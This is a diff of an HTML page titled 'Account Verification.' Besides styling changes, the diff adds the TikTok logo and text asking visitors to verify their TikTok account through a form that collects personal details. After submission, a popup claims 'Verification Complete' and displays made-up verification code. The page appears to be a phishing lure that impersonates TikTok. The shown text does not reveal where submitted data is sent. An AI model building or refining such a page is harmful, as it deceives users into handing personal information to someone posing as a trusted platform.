@@ -7,7 +7,7 @@
   <style>
     :root {
       --primary: #ff0050;
-      --bg: #f0f0f5;
+      --bg: #f0f2f5;
       --white: #fff;
       --text: #222;
       --muted: #777;
@@ -22,67 +22,73 @@
 
     body {
       margin: 0;
-      padding: 0;
+      padding: 40px 10px;
       background-color: var(--bg);
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
     }
 
     .form-wrapper {
       background-color: var(--white);
       width: 100%;
-      max-width: 500px;
-      padding: 40px 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 60px rgba(0,0,0,0.15);
+      max-width: 400px;
+      padding: 30px 25px;
+      border-radius: 14px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
       position: relative;
     }
 
+    .form-wrapper img {
+      width: 50px;
+      display: block;
+      margin: 0 auto 15px;
+    }
+
     .form-wrapper h2 {
-      font-size: 24px;
+      font-size: 22px;
       margin-bottom: 10px;
       text-align: center;
       color: var(--text);
     }
 
     .form-wrapper p {
-      font-size: 14px;
+      font-size: 13px;
       text-align: center;
       color: var(--muted);
-      margin-bottom: 30px;
+      margin-bottom: 25px;
     }
 
     label {
       display: block;
       font-size: 13px;
-      margin-bottom: 5px;
+      margin-bottom: 4px;
       color: var(--text);
     }
 
     input {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
+      padding: 10px 12px;
+      margin-bottom: 18px;
       border: 1px solid var(--border);
-      border-radius: 0px;
-      background: #fdfdfd;
+      border-radius: 0;
+      background: #fcfcfc;
       font-size: 14px;
-      transition: 0.3s;
     }
 
     input:focus {
       outline: none;
       border-color: var(--primary);
+      background: #fff;
     }
 
     button {
       width: 100%;
-      padding: 14px;
+      padding: 12px;
       background-color: var(--primary);
       color: #fff;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: bold;
       border: none;
       cursor: pointer;
@@ -99,7 +105,7 @@
       top: 0; left: 0;
       width: 100vw;
       height: 100vh;
-      background: rgba(0, 0, 0, 0.8);
+      background: rgba(0, 0, 0, 0.85);
       justify-content: center;
       align-items: center;
       z-index: 9999;
@@ -107,17 +113,17 @@
 
     .popup-content {
       background: #fff;
-      padding: 40px;
+      padding: 30px;
       max-width: 600px;
       width: 90%;
       border-radius: 12px;
-      box-shadow: 0 0 50px rgba(0, 0, 0, 0.2);
       text-align: center;
-      animation: fadeIn 1s ease-in-out;
+      box-shadow: 0 0 60px rgba(0, 0, 0, 0.2);
+      animation: fadeIn 0.8s ease-in-out;
     }
 
     .popup-content h1 {
-      font-size: 28px;
+      font-size: 24px;
       margin-bottom: 20px;
       color: var(--success);
     }
@@ -130,12 +136,12 @@
       padding: 20px;
       border-radius: 10px;
       font-family: Consolas, monospace;
-      font-size: 14px;
+      font-size: 13px;
       overflow-x: auto;
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
+      from { opacity: 0; transform: scale(0.9); }
       to { opacity: 1; transform: scale(1); }
     }
   </style>
@@ -143,8 +149,9 @@
 <body>
 
   <div class="form-wrapper">
+    <img src="https://upload.wikimedia.org/wikipedia/en/6/69/TikTok_logo.svg" alt="TikTok Logo">
     <h2>Account Verification</h2>
-    <p>Please fill in your information to request verification.</p>
+    <p>Fill the form below to verify your TikTok account.</p>
     <form id="form">
       <label for="name">Full Name</label>
       <input type="text" id="name" placeholder="John Doe" required>
@@ -164,14 +171,13 @@
 
   <div class="popup" id="popup">
     <div class="popup-content">
-      <h1>Account Verified</h1>
+      <h1>Verification Complete</h1>
       <code>
-        // Verification Success Code<br>
-        const userVerified = true;<br>
-        const message = "Your TikTok account has been successfully verified!";<br>
-        console.log(message);<br>
-        alert("تم التحقق من الحساب بنجاح!");<br>
-        window.location.href = "/dashboard";
+        // TikTok Verification Code:<br>
+        const verified = true;<br>
+        const message = "تم توثيق الحساب بنجاح!";<br>
+        alert(message);<br>
+        location.href = "/welcome";
       </code>
     </div>
   </div>
